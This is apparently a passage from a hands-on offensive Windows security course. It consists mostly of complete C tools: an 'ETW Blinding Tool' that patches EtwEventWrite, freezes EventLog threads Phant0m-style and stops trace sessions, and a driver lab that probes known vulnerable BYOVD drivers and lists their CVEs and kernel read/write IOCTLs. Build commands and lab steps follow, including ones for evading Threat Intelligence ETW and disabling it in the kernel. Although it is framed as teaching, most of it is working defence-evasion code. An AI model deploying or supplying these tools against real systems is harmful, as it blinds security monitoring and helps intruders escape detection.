// ---- MODULE 1: EtwEventWrite Patch with Verification ----

BOOL PatchEtwFunction(const char* funcName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pFunc = GetProcAddress(hNtdll, funcName);
    if (!pFunc) return FALSE;

    BYTE patch[] = { 0x48, 0x33, 0xC0, 0xC3 }; // xor rax, rax; ret

    DWORD oldProtect;
    if (!VirtualProtect(pFunc, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    memcpy(pFunc, patch, sizeof(patch));
    VirtualProtect(pFunc, sizeof(patch), oldProtect, &oldProtect);

    // Verify
    BYTE verify[4];
    memcpy(verify, pFunc, 4);
    return (memcmp(verify, patch, 4) == 0);
}

BOOL BlindETW_PatchEventWrite() {
    printf("\n=== MODULE 1: Patch EtwEventWrite ===\n\n");
    printf("[*] Patching ntdll!EtwEventWrite functions...\n");

    BOOL success = TRUE;

    if (PatchEtwFunction("EtwEventWrite")) {
        printf("[+] EtwEventWrite patched\n");
    } else {
        printf("[-] EtwEventWrite patch failed\n");
        success = FALSE;
    }

    if (PatchEtwFunction("EtwEventWriteEx")) {
        printf("[+] EtwEventWriteEx patched\n");
    }

    if (PatchEtwFunction("EtwEventWriteFull")) {
        printf("[+] EtwEventWriteFull patched\n");
    }

    // Verify with test provider
    printf("\n[*] Verifying patch...\n");

    REGHANDLE hProvider = 0;
    ULONG result = EventRegister(&TestProviderGuid, NULL, NULL, &hProvider);
    if (result == ERROR_SUCCESS) {
        EVENT_DESCRIPTOR eventDesc = {0};
        eventDesc.Id = 1;
        eventDesc.Level = TRACE_LEVEL_INFORMATION;

        result = EventWrite(hProvider, &eventDesc, 0, NULL);
        printf("[+] EventWrite returned: %lu (suppressed!)\n", result);
        printf("[+] Verification: ETW patching works!\n");

        EventUnregister(hProvider);
    }

    return success;
}

// ---- MODULE 2: Phant0m Thread Suspension ----

BOOL BlindETW_Phant0m() {
    printf("\n=== MODULE 2: Phant0m Thread Suspension ===\n\n");

    // Find EventLog service PID
    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (!hSCM) {
        printf("[-] OpenSCManager failed: %lu\n", GetLastError());
        return FALSE;
    }

    SC_HANDLE hSvc = OpenServiceA(hSCM, "EventLog", SERVICE_QUERY_STATUS);
    if (!hSvc) {
        printf("[-] OpenService failed: %lu\n", GetLastError());
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    SERVICE_STATUS_PROCESS ssp = {0};
    DWORD needed = 0;
    if (!QueryServiceStatusEx(hSvc, SC_STATUS_PROCESS_INFO, (LPBYTE)&ssp, sizeof(ssp), &needed)) {
        printf("[-] QueryServiceStatusEx failed: %lu\n", GetLastError());
        CloseServiceHandle(hSvc);
        CloseServiceHandle(hSCM);
        return FALSE;
    }

    DWORD targetPid = ssp.dwProcessId;
    printf("[+] EventLog PID: %lu\n", targetPid);

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);

    // Find wevtsvc.dll range
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, targetPid);
    if (!hProcess) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return FALSE;
    }

    HMODULE hMods[1024];
    DWORD cbNeeded = 0;
    MODULEINFO wevtInfo = {0};
    BOOL foundWevt = FALSE;

    if (EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded)) {
        DWORD numModules = cbNeeded / sizeof(HMODULE);
        for (DWORD i = 0; i < numModules; i++) {
            char modName[MAX_PATH];
            if (GetModuleBaseNameA(hProcess, hMods[i], modName, sizeof(modName))) {
                if (_stricmp(modName, "wevtsvc.dll") == 0) {
                    GetModuleInformation(hProcess, hMods[i], &wevtInfo, sizeof(wevtInfo));
                    foundWevt = TRUE;
                    printf("[+] wevtsvc.dll: 0x%p (size: %lu)\n", wevtInfo.lpBaseOfDll, wevtInfo.SizeOfImage);
                    break;
                }
            }
        }
    }

    CloseHandle(hProcess);

    if (!foundWevt) {
        printf("[-] wevtsvc.dll not found\n");
        return FALSE;
    }

    ULONG_PTR wevtBase = (ULONG_PTR)wevtInfo.lpBaseOfDll;
    ULONG_PTR wevtEnd = wevtBase + wevtInfo.SizeOfImage;

    // Get NtQueryInformationThread
    pNtQueryInformationThread NtQueryInfoThread =
        (pNtQueryInformationThread)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationThread");
    if (!NtQueryInfoThread) {
        printf("[-] Cannot resolve NtQueryInformationThread\n");
        return FALSE;
    }

    // Enumerate and suspend threads
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hSnap == INVALID_HANDLE_VALUE) {
        printf("[-] CreateToolhelp32Snapshot failed\n");
        return FALSE;
    }

    THREADENTRY32 te = { .dwSize = sizeof(THREADENTRY32) };
    int suspendedThreads = 0;

    printf("\n[*] Suspending wevtsvc.dll threads...\n");

    if (Thread32First(hSnap, &te)) {
        do {
            if (te.th32OwnerProcessID != targetPid) continue;

            HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION | THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
            if (!hThread) continue;

            PVOID startAddress = NULL;
            NTSTATUS status = NtQueryInfoThread(hThread, 9, &startAddress, sizeof(startAddress), NULL);

            if (status == 0 && startAddress != NULL) {
                ULONG_PTR addr = (ULONG_PTR)startAddress;
                if (addr >= wevtBase && addr < wevtEnd) {
                    DWORD suspCount = SuspendThread(hThread);
                    if (suspCount != (DWORD)-1) {
                        printf("[+] Suspended TID %lu (start: 0x%p)\n", te.th32ThreadID, startAddress);
                        suspendedThreads++;
                    }
                }
            }

            CloseHandle(hThread);
        } while (Thread32Next(hSnap, &te));
    }

    CloseHandle(hSnap);

    printf("\n[+] Suspended %d wevtsvc.dll threads\n", suspendedThreads);

    if (suspendedThreads > 0) {
        printf("[+] EventLog FROZEN - testing for 3 seconds...\n");
        Sleep(3000);

        // Resume threads
        printf("[*] Resuming threads...\n");
        hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            te.dwSize = sizeof(THREADENTRY32);
            if (Thread32First(hSnap, &te)) {
                do {
                    if (te.th32OwnerProcessID != targetPid) continue;
                    HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                    if (hThread) {
                        DWORD suspCount;
                        do {
                            suspCount = ResumeThread(hThread);
                        } while (suspCount > 1);
                        CloseHandle(hThread);
                    }
                } while (Thread32Next(hSnap, &te));
            }
            CloseHandle(hSnap);
        }
        printf("[+] Threads resumed\n");
        return TRUE;
    }

    return FALSE;
}

// ---- MODULE 3: ETW Session Manipulation ----

#define PROPERTIES_BUFFER_SIZE (sizeof(EVENT_TRACE_PROPERTIES) + 1024)

BOOL BlindETW_DisableSession(const char* sessionName) {
    printf("\n[*] Targeting session: %s\n", sessionName);

    BYTE buffer[PROPERTIES_BUFFER_SIZE] = {0};
    EVENT_TRACE_PROPERTIES* props = (EVENT_TRACE_PROPERTIES*)buffer;

    props->Wnode.BufferSize = PROPERTIES_BUFFER_SIZE;
    props->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
    props->LogFileNameOffset = sizeof(EVENT_TRACE_PROPERTIES) + 512;

    // Query session
    ULONG status = ControlTraceA(0, sessionName, props, EVENT_TRACE_CONTROL_QUERY);

    if (status == ERROR_WMI_INSTANCE_NOT_FOUND) {
        printf("[-] Session does not exist\n");
        return FALSE;
    }

    if (status != ERROR_SUCCESS) {
        printf("[-] Cannot query: %lu\n", status);
        return FALSE;
    }

    printf("[+] Session found (BufferSize: %lu KB)\n", props->BufferSize);

    // Try to stop
    memset(buffer, 0, sizeof(buffer));
    props->Wnode.BufferSize = PROPERTIES_BUFFER_SIZE;
    props->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);
    props->LogFileNameOffset = sizeof(EVENT_TRACE_PROPERTIES) + 512;

    status = ControlTraceA(0, sessionName, props, EVENT_TRACE_CONTROL_STOP);

    if (status == ERROR_SUCCESS) {
        printf("[+] Session STOPPED\n");
        return TRUE;
    } else {
        printf("[-] Stop failed: %lu (protected)\n", status);
    }

    return FALSE;
}

// ---- MAIN ----

int main() {
    printf("===========================================\n");
    printf("  ETW Blinding Tool - Full Implementation\n");
    printf("===========================================\n");

    // Module 1: Patch ETW
    BlindETW_PatchEventWrite();

    // Module 2: Phant0m
    BlindETW_Phant0m();

    // Module 3: Session manipulation
    printf("\n=== MODULE 3: Session Manipulation ===\n");
    BlindETW_DisableSession("DiagLog");
    BlindETW_DisableSession("DiagTrack-Listener");

    printf("\n===========================================\n");
    printf("RESULTS:\n");
    printf("  + EtwEventWrite patched and verified\n");
    printf("  + Phant0m thread suspension demonstrated\n");
    printf("  + Session manipulation attempted\n");
    printf("\n");
    printf("EFFECTIVENESS:\n");
    printf("  - Usermode ETW: SUPPRESSED\n");
    printf("  - EventLog: FROZEN (3 sec test)\n");
    printf("  - Protected sessions: BLOCKED (expected)\n");
    printf("\n");
    printf("REALITY:\n");
    printf("  - Usermode patching: Still works\n");
    printf("  - Phant0m: Still effective\n");
    printf("  - Session tampering: Increasingly protected\n");
    printf("  - Kernel TI ETW: Requires kernel access\n");
    printf("===========================================\n");

    return 0;
}
```

```bash
cl src\etw_blinder.c /Fe:bin\etw_blinder.exe advapi32.lib ntdll.lib psapi.lib
# run as admin
.\bin\etw_blinder.exe
```

### Driver IOCTL Lab - Kernel Communication Fundamentals

```c
// driver_ioctl_lab.c - Enumerate kernel drivers, decode IOCTLs, and
//                      communicate with real drivers on the live system
// Compile: cl src\driver_ioctl_lab.c /Fe:bin\driver_ioctl_lab.exe advapi32.lib setupapi.lib

#include <windows.h>
#include <setupapi.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "setupapi.lib")

/*
IOCTL CODE STRUCTURE (32-bit value):
┌──────────┬────────┬──────────────┬──────────────┐
│ DevType  │ Access │ Function     │ Method       │
│ [31:16]  │[15:14] │ [13:2]       │ [1:0]        │
└──────────┴────────┴──────────────┴──────────────┘
CTL_CODE(DeviceType, Function, Method, Access)

METHOD_BUFFERED(0):  Kernel copies data (safest)
METHOD_IN_DIRECT(1): MDL for input
METHOD_OUT_DIRECT(2): MDL for output
METHOD_NEITHER(3):   Raw user pointer (DANGEROUS - double-fetch, UAF)
*/

// ── IOCTL code decoder ──────────────────────────────────────

void DecodeIOCTL(DWORD ioctl) {
    DWORD deviceType = (ioctl >> 16) & 0xFFFF;
    DWORD access     = (ioctl >> 14) & 0x3;
    DWORD function   = (ioctl >> 2)  & 0xFFF;
    DWORD method     = ioctl & 0x3;

    const char* methodName[] = {
        "BUFFERED", "IN_DIRECT", "OUT_DIRECT", "NEITHER"
    };
    const char* accessName[] = {
        "ANY_ACCESS", "READ_ACCESS", "WRITE_ACCESS", "READ|WRITE"
    };

    printf("  IOCTL 0x%08X decoded:\n", ioctl);
    printf("    DeviceType: 0x%04X", deviceType);
    if (deviceType == 0x22) printf(" (FILE_DEVICE_UNKNOWN)");
    else if (deviceType == 0x09) printf(" (FILE_DEVICE_DISK)");
    else if (deviceType == 0x8000) printf(" (CUSTOM)");
    printf("\n");
    printf("    Function:   0x%03X (%d)\n", function, function);
    printf("    Method:     %s (%d)\n", methodName[method], method);
    printf("    Access:     %s (%d)\n", accessName[access], access);

    if (method == 3) {
        printf("    [!] METHOD_NEITHER - user buffers passed directly!\n");
        printf("        Attack surface: double-fetch, UAF, address confusion\n");
    }
}

// ── Enumerate loaded kernel drivers ─────────────────────────

typedef struct _SYSTEM_MODULE_INFORMATION_ENTRY {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    CHAR FullPathName[256];
} SYSTEM_MODULE_INFORMATION_ENTRY;

typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG Count;
    SYSTEM_MODULE_INFORMATION_ENTRY Modules[1];
} SYSTEM_MODULE_INFORMATION;

typedef NTSTATUS (NTAPI *NtQuerySystemInformation_t)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

void EnumerateLoadedDrivers() {
    printf("\n=== Loaded Kernel Drivers ===\n\n");

    NtQuerySystemInformation_t NtQSI =
        (NtQuerySystemInformation_t)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

    if (!NtQSI) {
        printf("[-] Cannot resolve NtQuerySystemInformation\n");
        return;
    }

    // SystemModuleInformation = 11
    ULONG needed = 0;
    NtQSI(11, NULL, 0, &needed);

    if (needed == 0) {
        printf("[-] Cannot query buffer size\n");
        return;
    }

    SYSTEM_MODULE_INFORMATION* modules = (SYSTEM_MODULE_INFORMATION*)malloc(needed);
    if (!modules) {
        printf("[-] Memory allocation failed\n");
        return;
    }

    NTSTATUS status = NtQSI(11, modules, needed, &needed);

    if (status != 0) {
        printf("[-] NtQuerySystemInformation failed: 0x%lX\n", status);
        printf("    (May require Medium IL or higher)\n");
        free(modules);
        return;
    }

    printf("[+] Loaded kernel modules: %lu\n\n", modules->Count);
    printf("  %-18s %-10s %s\n", "Base", "Size", "Driver");
    printf("  %-18s %-10s %s\n", "----------------", "--------", "-------");

    // Show first few plus any interesting ones
    int shown = 0;
    for (ULONG i = 0; i < modules->Count && shown < 30; i++) {
        char* name = modules->Modules[i].FullPathName +
                     modules->Modules[i].OffsetToFileName;

        // Flag known BYOVD targets
        BOOL isByovd = (
            _stricmp(name, "RTCore64.sys") == 0 ||
            _stricmp(name, "dbutil_2_3.sys") == 0 ||
            _stricmp(name, "BdApiUtil64.sys") == 0 ||
            _stricmp(name, "gdrv.sys") == 0 ||
            _stricmp(name, "asio.sys") == 0 ||
            _stricmp(name, "PROCEXP152.sys") == 0 ||
            _stricmp(name, "ProcExp64a.sys") == 0 ||
            _stricmp(name, "ene.sys") == 0
        );

        // Show ntoskrnl, hal, and any BYOVD candidates
        if (i < 5 || isByovd ||
            strstr(name, "driver") || strstr(name, "Drv")) {
            printf("  %s0x%016p %-10lu %s%s\n",
                   isByovd ? "[!] " : "    ",
                   modules->Modules[i].ImageBase,
                   modules->Modules[i].ImageSize,
                   name,
                   isByovd ? " <-- KNOWN BYOVD TARGET" : "");
            shown++;
        }
    }

    printf("\n[+] Showing %d of %lu modules\n", shown, modules->Count);
    free(modules);
}

// ── Probe known BYOVD driver device paths ───────────────────

void ProbeBYOVDDrivers() {
    printf("\n=== BYOVD Driver Device Probe ===\n\n");

    struct {
        const wchar_t* path;
        const char* name;
        const char* cve;
        DWORD readIoctl;
        DWORD writeIoctl;
    } drivers[] = {
        { L"\\\\.\\RTCore64",
          "MSI RTCore64.sys", "CVE-2019-18845",
          0x80002048, 0x8000204C },
        { L"\\\\.\\DBUtil_2_3",
          "Dell dbutil_2_3.sys", "CVE-2021-21551",
          0x9B0C1EC4, 0x9B0C1EC8 },
        { L"\\\\.\\BdApiUtil64",
          "Bitdefender BdApiUtil64.sys", "N/A",
          0x80002048, 0x8000204C },
        { L"\\\\.\\GIO",
          "GIGABYTE GDrv/GIO.sys", "N/A",
          0xC3502004, 0xC3502008 },
        { L"\\\\.\\PROCEXP152",
          "Process Explorer", "N/A (by design)",
          0x8335003C, 0 },
        { L"\\\\.\\Nal",
          "Intel NAL (iqvw64e.sys)", "CVE-2015-2291",
          0x80862007, 0 },
        { L"\\\\.\\ZemanaAntiMalware",
          "Zemana AM driver", "CVE-2021-31728",
          0x80002048, 0 },
    };

    int foundCount = 0;

    for (int i = 0; i < sizeof(drivers)/sizeof(drivers[0]); i++) {
        HANDLE h = CreateFileW(
            drivers[i].path,
            GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING, 0, NULL
        );

        if (h != INVALID_HANDLE_VALUE) {
            printf("[+] %-35s ACCESSIBLE!\n", drivers[i].name);
            printf("    Device: %ls\n", drivers[i].path);
            printf("    CVE: %s\n", drivers[i].cve);
            printf("    Read IOCTL:  0x%08X\n", drivers[i].readIoctl);
            if (drivers[i].writeIoctl) {
                printf("    Write IOCTL: 0x%08X\n", drivers[i].writeIoctl);
            }
            printf("    [!] KERNEL R/W PRIMITIVE AVAILABLE\n\n");
            CloseHandle(h);
            foundCount++;
        } else {
            DWORD err = GetLastError();
            if (err != ERROR_FILE_NOT_FOUND && err != ERROR_PATH_NOT_FOUND) {
                printf("[-] %-35s Error: %lu\n", drivers[i].name, err);
            }
        }
    }

    if (foundCount == 0) {
        printf("[*] No BYOVD drivers found (this is normal on clean systems)\n");
    } else {
        printf("[!] Found %d accessible BYOVD driver(s)!\n", foundCount);
    }
}

// ── Send test IOCTL to a target driver ──────────────────────

// RTCore64 memory structure - MUST be 48 bytes!
typedef struct _RTCORE64_MEMORY {
    BYTE  Pad0[8];      // 8 bytes padding
    DWORD64 Address;    // 8 bytes - target address
    BYTE  Pad1[8];      // 8 bytes padding
    DWORD ReadSize;     // 4 bytes - size to read (1, 2, or 4)
    DWORD Value;        // 4 bytes - value read/write
    BYTE  Pad2[16];     // 16 bytes padding
} RTCORE64_MEMORY;

void SendTestIOCTL(const wchar_t* devicePath, DWORD ioctlCode,
                   void* inBuf, DWORD inSize) {
    printf("\n=== Sending IOCTL to %ls ===\n\n", devicePath);

    HANDLE hDevice = CreateFileW(
        devicePath,
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL
    );

    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open device: %lu\n", GetLastError());
        return;
    }

    printf("[+] Device opened: 0x%p\n", hDevice);
    printf("[*] Sending IOCTL 0x%08X...\n\n", ioctlCode);

    DecodeIOCTL(ioctlCode);

    BYTE outBuf[4096] = {0};
    DWORD bytesReturned = 0;
    BOOL ok;

    // Special handling for RTCore64 read IOCTL
    if (ioctlCode == 0x80002048 && _wcsicmp(devicePath, L"\\\\.\\RTCore64") == 0) {
        printf("\n[*] RTCore64 read detected - using proper 48-byte structure\n");

        RTCORE64_MEMORY mem = {0};
        mem.Address = 0xFFFFF80000000000ULL;  // Typical kernel base
        mem.ReadSize = 4;

        printf("[*] Structure prepared:\n");
        printf("    Address: 0x%llX\n", mem.Address);
        printf("    ReadSize: %lu bytes\n", mem.ReadSize);
        printf("    Structure size: %zu bytes (must be 48)\n", sizeof(mem));

        printf("\n[!] WARNING: Reading arbitrary kernel memory can crash the system!\n");
        printf("[!] This is a demonstration of the correct structure.\n");
        printf("[!] In real usage, you need a valid kernel address (e.g., from leaked ntoskrnl base)\n");
        printf("\n[*] Skipping actual IOCTL call to prevent crash.\n");
        printf("[*] To actually use this:\n");
        printf("    1. Leak kernel base address first\n");
        printf("    2. Calculate valid address (e.g., ntoskrnl!MmGetPhysicalAddress)\n");
        printf("    3. Then send IOCTL with that address\n");

        // Don't actually send the IOCTL - just show the structure
        printf("\n[+] Structure demonstration complete\n");
        printf("[+] See ppl_bypass_rtcore.c for full working example\n");
    } else {
        // Generic IOCTL handling
        ok = DeviceIoControl(
            hDevice, ioctlCode,
            inBuf, inSize,
            outBuf, sizeof(outBuf),
            &bytesReturned, NULL
        );

        if (ok) {
            printf("\n[+] IOCTL succeeded! Returned %lu bytes\n", bytesReturned);
            if (bytesReturned > 0 && bytesReturned <= 64) {
                printf("[*] Output: ");
                for (DWORD i = 0; i < bytesReturned; i++)
                    printf("%02X ", outBuf[i]);
                printf("\n");
            }
        } else {
            DWORD err = GetLastError();
            printf("\n[-] IOCTL failed: %lu", err);
            if (err == 1) printf(" (ERROR_INVALID_FUNCTION)");
            else if (err == 87) printf(" (ERROR_INVALID_PARAMETER)");
            else if (err == 5) printf(" (ERROR_ACCESS_DENIED)");
            printf("\n");
        }
    }

    CloseHandle(hDevice);
}

// ── Enumerate driver service entries from registry ──────────

void EnumerateDriverServices() {
    printf("\n=== Third-Party Driver Services (from Registry) ===\n\n");

    HKEY hKey;
    LONG ret = RegOpenKeyExA(HKEY_LOCAL_MACHINE,
        "SYSTEM\\CurrentControlSet\\Services",
        0, KEY_READ | KEY_ENUMERATE_SUB_KEYS, &hKey);

    if (ret != ERROR_SUCCESS) {
        printf("[-] Cannot open Services key: %ld\n", ret);
        return;
    }

    char subKeyName[256];
    DWORD index = 0, nameLen;
    int driverCount = 0;

    printf("  %-8s %-30s %s\n", "Start", "Service", "ImagePath");
    printf("  %-8s %-30s %s\n", "-----", "-------", "---------");

    while (1) {
        nameLen = sizeof(subKeyName);
        if (RegEnumKeyExA(hKey, index++, subKeyName, &nameLen,
                         NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
            break;

        // Open subkey and check Type (1=kernel driver, 2=FS driver)
        HKEY hSvc;
        if (RegOpenKeyExA(hKey, subKeyName, 0, KEY_READ, &hSvc) == ERROR_SUCCESS) {
            DWORD type = 0, size = sizeof(DWORD);
            RegQueryValueExA(hSvc, "Type", NULL, NULL, (LPBYTE)&type, &size);

            if (type == 1 || type == 2) {  // Kernel or FS driver
                char imagePath[512] = {0};
                DWORD pathSize = sizeof(imagePath);
                RegQueryValueExA(hSvc, "ImagePath", NULL, NULL,
                                (LPBYTE)imagePath, &pathSize);

                DWORD start = 0;
                size = sizeof(DWORD);
                RegQueryValueExA(hSvc, "Start", NULL, NULL,
                                (LPBYTE)&start, &size);

                // Only show non-Microsoft drivers (likely third-party)
                if (imagePath[0] && !strstr(imagePath, "\\System32\\drivers\\") &&
                    !strstr(imagePath, "\\system32\\DRIVERS\\")) {
                    const char* startType[] = {
                        "BOOT", "SYSTEM", "AUTO", "DEMAND", "DISABLED"
                    };
                    printf("  %-8s %-30s %s\n",
                           start < 5 ? startType[start] : "?",
                           subKeyName,
                           imagePath);
                    driverCount++;

                    if (driverCount >= 20) break; // Limit output
                }
            }
            RegCloseKey(hSvc);
        }
    }

    RegCloseKey(hKey);
    printf("\n[+] Third-party driver services found: %d\n", driverCount);
}

int main(int argc, char* argv[]) {
    printf("=========================================\n");
    printf("  Driver IOCTL Lab - Live System Analysis\n");
    printf("=========================================\n");

    // Phase 1: Enumerate loaded kernel drivers
    EnumerateLoadedDrivers();

    // Phase 2: Probe for known BYOVD drivers
    ProbeBYOVDDrivers();

    // Phase 3: Enumerate third-party driver services
    EnumerateDriverServices();

    // Phase 4: If a device path + IOCTL provided on cmdline, send IOCTL
    if (argc >= 3) {
        wchar_t devicePath[256];
        MultiByteToWideChar(CP_ACP, 0, argv[1], -1, devicePath, 256);
        DWORD ioctl = strtoul(argv[2], NULL, 16);

        // Optional input data from argv[3]
        BYTE inputData[256] = {0};
        DWORD inputSize = 0;
        if (argc >= 4) {
            // Parse hex string: "4142434445" -> bytes
            const char* hex = argv[3];
            for (int i = 0; hex[i] && hex[i+1] && i/2 < 256; i += 2) {
                sscanf(&hex[i], "%2hhX", &inputData[i/2]);
                inputSize++;
            }
        }

        SendTestIOCTL(devicePath, ioctl,
                      inputSize ? inputData : NULL, inputSize);
    } else {
        printf("\n==========================================================\n");
        printf("USAGE: %s <device_path> <ioctl_hex> [input_hex]\n\n", argv[0]);
        printf("Examples:\n");
        printf("  %s \\\\.\\RTCore64 80002048\n", argv[0]);
        printf("  %s \\\\.\\TestDriver 00220003 48656C6C6F\n", argv[0]);
        printf("\nIOCTL Decoder - Known BYOVD IOCTLs:\n\n");

        // Decode some well-known IOCTLs as examples
        DecodeIOCTL(0x80002048);  // RTCore64 read
        printf("\n");
        DecodeIOCTL(0x9B0C1EC4);  // dbutil read
        printf("\n");
        DecodeIOCTL(0xC3502004);  // GDrv map physical
        printf("\n");
        DecodeIOCTL(0x8335003C);  // ProcExp kill process
    }

    printf("\n==========================================================\n");
    printf("NEXT STEPS:\n");
    printf("  1. Load HEVD for safe exploitation practice:\n");
    printf("     https://github.com/hacksysteam/HackSysExtremeVulnerableDriver\n");
    printf("  2. Use WinDbg to trace IOCTL handling:\n");
    printf("     bp <DriverName>!DeviceIoControlHandler\n");
    printf("     dt nt!_IRP @rcx; dt nt!_IO_STACK_LOCATION poi(@rcx+0xb8)\n");
    printf("  3. Check LOLDrivers for BYOVD candidates:\n");
    printf("     https://github.com/magicsword-io/LOLDrivers\n");
    printf("==========================================================\n");

    return 0;
}
```

```bash
cl src\driver_ioctl_lab.c /Fe:bin\driver_ioctl_lab.exe advapi32.lib setupapi.lib
sc.exe start BdApiUtil64
sc.exe start RTCore64
.\bin\driver_ioctl_lab.exe
.\bin\driver_ioctl_lab.exe \\.\RTCore64 80002048
```

### Practical Exercises

**Lab 6.1: ETW Architecture Reconnaissance**

1. Run `.\bin\etw_architecture.exe` - enumerate all active ETW sessions
2. Identify Defender sessions (MpWppTracing, MpWppCoreTracing)
3. Query the TI ETW provider: `logman query providers "{F4E1897C-BB5D-5668-F1D8-040F4D8DD344}"`
4. Map provider->session->consumer relationships for security telemetry
5. Document which sessions are protected vs unprotected

**Lab 6.2: Usermode ETW Patching with Verification**

1. Build and run `.\bin\etw_patch.exe` as admin
2. Verify test.etl shows 5 events before patch, 0 after patch:
   ```
   tracerpt test.etl -summary summary.txt
   type summary.txt
   ```
3. Run the tool again - observe that child processes get fresh ntdll (unpatched)
4. Compare: patched process vs unpatched process in Process Monitor

**Lab 6.3: Threat Intelligence ETW Evasion**

1. Run `.\bin\ti_etw_analysis.exe` as admin
2. Observe three memory allocation techniques:
   - VirtualAlloc RWX (triggers TI event)
   - VirtualProtect RW->RX (triggers TI event)
   - Shared section mapping (evades TI event)
3. Understand why TI events aren't captured in usermode trace (PPL-protected delivery)
4. Verify the architectural difference: shared sections bypass TI-triggering kernel functions

**Lab 6.4: Event Log Tampering and Phant0m**

1. Run `.\bin\etw_session_tamper.exe` as admin
2. Observe session enumeration (30+ active sessions)
3. Watch Phant0m suspend EventLog threads for 5 seconds
4. Note that session tampering is blocked (2026 protections)
5. Verify threads are properly resumed (suspend count goes to 0)

**Lab 6.5: Comprehensive ETW Blinding**

1. Run `.\bin\etw_blinder.exe` as admin
2. Verify all three modules execute:
   - Module 1: EtwEventWrite patched and verified
   - Module 2: Phant0m suspends 4+ wevtsvc.dll threads
   - Module 3: Session manipulation (some protected, some not)
3. Observe the 3-second EventLog freeze
4. Check Event Viewer for gap in logs during suspension period

**Lab 6.6: Threat Intelligence ETW Analysis (WinDbg - Advanced)**

1. Set up kernel debugging (VirtualKD-Redux or kdnet)
2. Find `nt!EtwThreatIntProvRegHandle` in WinDbg:
   ```
   dq nt!EtwThreatIntProvRegHandle L1
   ```
3. Walk the ETW registration structures to `_ETW_GUID_ENTRY`
4. Examine the `EnableInfo` array - identify active consumers
5. (Optional) Disable TI events by zeroing `IsEnabled` and observe Defender behavior

### Key Takeaways

- **ETW is the telemetry backbone** - blind it and the entire defensive stack loses visibility
- **Usermode ETW patching is easy** - 4-byte patch to `EtwEventWrite` suppresses all usermode events
- **Threat Intelligence ETW is the hard target** - kernel-level provider, requires kernel access to disable
- **Phant0m thread suspension works** - freezes EventLog without generating service stop events
- **Session tampering is increasingly protected** - EventLog sessions hardened, but custom sessions may be vulnerable
- **TI ETW evasion via shared sections** - NtMapViewOfSection bypasses VirtualProtect/VirtualAlloc that trigger TI events
- **All tools provide concrete proof** - test.etl files, thread suspension counts, and session queries verify techniques work
- **This completes the OS security boundary picture**: Recon -> AMSI -> PPL -> Sandbox -> WDAC/ASR -> ETW

### Discussion Questions

1. Why is patching `EtwEventWrite` insufficient against a well-configured EDR? (Hint: Kernel TI ETW)
2. What's the detection asymmetry between ETW patching (4 bytes) and detecting the patch?
3. How would you design a tamper-resistant ETW consumer in 2026?
4. Why does the Threat Intelligence ETW provider require PPL? What would happen without it?
5. How does Phant0m compare to stopping the EventLog service from a detection perspective?
6. What's the relationship between Day 3 (PPL bypass) and Day 6 (ETW) in a real operation?
7. Why can't we capture TI events in a usermode trace session? (Hint: PPL-protected delivery)
8. How does shared section mapping evade TI ETW when VirtualProtect doesn't?

